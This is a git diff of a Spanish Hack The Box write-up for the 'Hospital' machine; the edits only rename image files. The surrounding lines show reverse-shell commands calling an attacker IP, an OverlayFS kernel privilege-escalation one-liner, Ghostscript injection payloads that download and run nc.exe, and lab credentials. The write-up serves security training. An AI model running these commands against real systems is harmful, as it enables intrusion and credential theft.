@@ -3,7 +3,7 @@ title: "Hospital - WriteUp"
 date: Sun Dec 29 2024 15:45:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, cve-2023-32629, dirb, winrm, cve-2023-2640, powershell, ssh, linpeas]
-image: /assets/img/htb-writeups/Pasted image 20231207112131.png
+image: /assets/img/htb-writeups/Pasted-image-20231207112131.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231207112131.png
   platform="HTB"
 %}
 
-![Hospital](/assets/img/htb-writeups/Pasted image 20231207112131.png)
+![Hospital](/assets/img/htb-writeups/Pasted-image-20231207112131.png)
 
 Tags:  
 
@@ -132,7 +132,7 @@ Tenemos un panel de login de correo RoundCube.
 https://hospital.htb/
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112131.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207112131.png)
 
 Acceso de usuario de la web del hospital
 
@@ -140,7 +140,7 @@ Acceso de usuario de la web del hospital
 http://10.129.229.189:8080/login.php
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112410.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207112410.png)
 
 Nos creamos una cuenta y cuando accedemos con las credenciales creadas, accedemos a un panel de subida de archivos.
 
@@ -148,7 +148,7 @@ Nos creamos una cuenta y cuando accedemos con las credenciales creadas, accedemo
 http://10.129.229.189:8080/index.php
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112548.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207112548.png)
 
 La intrusión puede venir por aquí. Pero vamos a seguir enumerando.
 
@@ -158,7 +158,7 @@ FUZZING
 $ gobuster dir -u http://10.129.229.189:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120221.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207120221.png)
 
 Encontramos el nombre de la ruta donde supuestamente se subirán los archivos.
 
@@ -166,7 +166,7 @@ Abrimos BurpSuite para ver la forma en la que los archivos se suben.
 
 En este caso voy a probar con un archivo de texto con el contenido "hola caracola"
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120639.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207120639.png)
 
 Todo bien. Vamos a ver ahora si lo almacena en la carpeta /uploads
 
@@ -174,7 +174,7 @@ Todo bien. Vamos a ver ahora si lo almacena en la carpeta /uploads
 http://10.129.229.189:8080/uploads/test.txt
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120803.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207120803.png)
 
 Pues parece que sí. Ahora vamos a probar de subir archivos maliciosos para ver en qué formato se lo traga...
 
@@ -186,11 +186,11 @@ Nos lo descargamos lo renombramos a .phar lo subimos.
 
 Nos vamos a la URL de /uploads seguido del nombre del archivo. En mi caso es _shell.phar_.
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207122843.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207122843.png)
 
 Estamos dentro. Empezamos a enumerar
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207125128.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207125128.png)
 
 Descubrimos unas credenciales:
 
@@ -204,7 +204,7 @@ Vamos a enviarnos una shell remota, nos ponemos a la escucha con nc (en mi caso 
 $ /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.68/443 0>&1'
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207125736.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207125736.png)
 
 Dentro. Ponemos la terminal full interactiva y continuamos...
 
@@ -216,9 +216,9 @@ Vamos a explorar la BBDD ya que conocemos los datos de acceso.
 $ mysql -u root -p
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207130431.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207130431.png)
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207130602.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207130602.png)
 
 Copiamos los hashes y vamos a intentar romperlos con _hashcat_:
 
@@ -226,7 +226,7 @@ Copiamos los hashes y vamos a intentar romperlos con _hashcat_:
 $ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207131501.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207131501.png)
 
 ```http
 admin:123456
@@ -236,13 +236,13 @@ Creo que esto nos va a servir de poco o nada...
 
 Vamos a enumerar el sistema.
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132036.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207132036.png)
 
 Buscamos exploits de kernel y encontramos una vulnerabilidad que afecta a esta versión:
 
 https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132249.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207132249.png)
 
 Nos bajamos el exploit y lo subimos a la máquina mediante _wget_
 
@@ -260,7 +260,7 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132836.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207132836.png)
 
 Perfecto! ha funcionado. Ahora a escapar de aquí...
 
@@ -274,7 +274,7 @@ root
 
 Encontramos el hash del usuario _drwilliams_ en el archivo /etc/shadow
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207141331.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207141331.png)
 
 Lo copiamos y se lo damos a nuestro amigo _john_ para ver qué puede hacer con él:
 
@@ -282,7 +282,7 @@ Lo copiamos y se lo damos a nuestro amigo _john_ para ver qué puede hacer con �
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashv6
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207141442.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207141442.png)
 
 Y nos lo encuentra! Tenemos nuestras primeras credenciales!
 
@@ -296,17 +296,17 @@ Vamos a probar las credenciales en el servidor de correo RoundCube:
 https://hospital.htb/
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160513.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207160513.png)
 
 Entramos y tenemos una pista de como seguir...
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160800.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207160800.png)
 
 Nos pide un diseño en formato .eps para que lo pueda abrir con el programa _GhostScript_
 
 Y encontramos esto: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207161224.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207161224.png)
 
 Nos lo descargamos y lo probamos.
 
@@ -320,7 +320,7 @@ Una vez que tengamos todo preparado es hora de preparar el archivo _.eps_ malici
 
 Abrimos otra terminal en la carpeta del exploit y escribimos lo siguiente siguiendo las indicaciones del exploit:
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207195330.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207195330.png)
 
 ```bash
 $ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.68:8000/nc64.exe -o nc.exe" --filename file.eps
@@ -331,21 +331,21 @@ $ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.68 4444 
 
 Una vez generado el archivo _file.eps_ se lo enviaremos por correo a _drbrown@hospital.htb_ desde la web de RoundCube del hospital.
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207190428.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207190428.png)
 
 Lo enviamos y nos quedamos a la espera...
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207192439.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207192439.png)
 
 Y después de unos minutos tenemos la shell...
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207202747.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207202747.png)
 
 NOTA: Si no funcionara con los dos comando a la vez podemos enviar dos correos con un comando en el adjunto _file.eps_ cada vez.
 
 Nada más entrar encontramos la contraseña del usuario _drbrown_ en un archivo .bat
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207203417.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207203417.png)
 
 El .bat es este:
 ```PowerShell
@@ -366,7 +366,7 @@ Las comprobamos:
 $ crackmapexec winrm 10.129.229.189 -u drbrown -p 'chr!$br0wn'
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207204046.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207204046.png)
 
 Bingo! Tenemos credenciales para administración remota!
 
@@ -374,7 +374,7 @@ Vamos a conectar por RDP y así podremos enumerar mejor el equipo aprovechando q
 
 Pero al conectar nos llevamos una sorpresa, y es que corre un script de escritura automática en la que teclea los credenciales de administrador!
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207205834.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207205834.png)
 
 Apuntamos la credenciales
 
@@ -388,7 +388,7 @@ Entramos:
 $ evil-winrm -i 10.129.229.189 -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'
 ```
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207210107.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207210107.png)
 
 P0wned!!!
 
@@ -429,9 +429,9 @@ $ ldapdomaindump -u 'hospital.htb\drwilliams' -p 'qwe123!@#' ldaps://10.129.48.2
 
 Montamos un servicio web y examinamos los archivos generados.
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207151827.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207151827.png)
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207151604.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207151604.png)
 
 Tenemos que intentar encontrar las credenciales de este usuario o escalar a él, ya que tiene permisos de acceso remoto y logs.
 
@@ -450,7 +450,7 @@ $ bloodhound
 
 Pero tampoco vemos nada que nos lleve a escalar de usuario...
 
-![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160152.png)
+![HOSPITAL](/assets/img/htb-writeups/Pasted-image-20231207160152.png)
 ---
 
 **Última actualización**: 2024-12-29<br>
